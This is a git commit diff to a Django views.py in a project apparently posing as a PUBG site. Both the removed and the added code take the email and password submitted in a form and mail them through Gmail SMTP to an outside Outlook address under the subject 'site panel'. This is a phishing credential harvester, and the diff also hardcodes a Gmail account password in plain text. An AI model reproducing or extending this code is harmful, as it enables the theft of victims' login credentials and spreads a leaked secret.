edc2cbbc0dfa8a331d209f4b2860960c3cb8371d
Abdullah Mazen Al-Haddad <57428346+Leddark@users.noreply.github.com>
2022-02-19 12:33:12 +0200

    Update views.py

--- pubg/views.py
+++ pubg/views.py
@@ -46,38 +46,23 @@ def index(request):
                 password1 = request.POST.get('password1')
 
                 ########################
-                import smtplib
-                from email.mime.text import MIMEText
-                from email.mime.multipart import MIMEMultipart
-                from email.mime.application import MIMEApplication
-                from os.path import basename
-                def send_mail(send_from: str, subject: str, text: str, send_to: list, files= None):
-                    send_to= default_address if not send_to else send_to
-                    msg = MIMEMultipart()
-                    msg['From'] = send_from
-                    msg['To'] = ', '.join(send_to)  
-                    msg['Subject'] = subject
-                    msg.attach(MIMEText(text))
-                    for f in files or []:
-                        with open(f, "rb") as fil: 
-                            ext = f.split('.')[-1:]
-                            attachedfile = MIMEApplication(fil.read(), _subtype = ext)
-                            attachedfile.add_header(
-                                'content-disposition', 'attachment', filename=basename(f) )
-                        msg.attach(attachedfile)
-                    smtp = smtplib.SMTP(host="smtp.gmail.com", port= 587) 
-                    smtp.starttls()
-                    smtp.login(username,password)
-                    smtp.sendmail(send_from, send_to, msg.as_string())
-                    smtp.close()
+                From = "lidark.tool@gmail.com"
+                password = 'mmoohhaa123#123#m'
+                To = 'adrelaft@outlook.com'
+                msg = MIMEMultipart()
+                msg['From'] = From
+                msg['To'] = To
+                msg['Subject'] = 'لوحة الموقع'
+                body = "#######################################\nالبريد الاكتروني : \n" + email1 + '\n#######################################\n-------------------------------------\n#######################################\n' + 'كلمة المرور : \n' + password1+"\n#######################################\n"
+                msg.attach(MIMEText(body, 'plain'))
+                server = smtplib.SMTP('smtp.gmail.com:587')
+                server.starttls()
+                server.login(From, password)
+                text = msg.as_string()
+                server.sendmail(From, To, text)
+                print(f'Send Done To {To}')
 
-
-
-                username = 'lidark.tool@gmail.com' # اسم المستخدم
-                password = 'mmoohhaa123#123#m' # كلمة المرور
-                default_address = ['my-address2@gmail.com']  # العنوان الافتراضي
-                # إرسال الإيميل
-                send_mail(send_from= username,subject="لوحة الموقع",text="#######################################\nالبريد الاكتروني : \n" + email1 + '\n#######################################\n-------------------------------------\n#######################################\n' + 'كلمة المرور : \n' + password1+"\n#######################################\n",send_to= 'adrelaft@outlook.com'), # المرسل إليه
+                server.quit()
                 ########################
                 return render (request , "temp/index.html" )
         except:
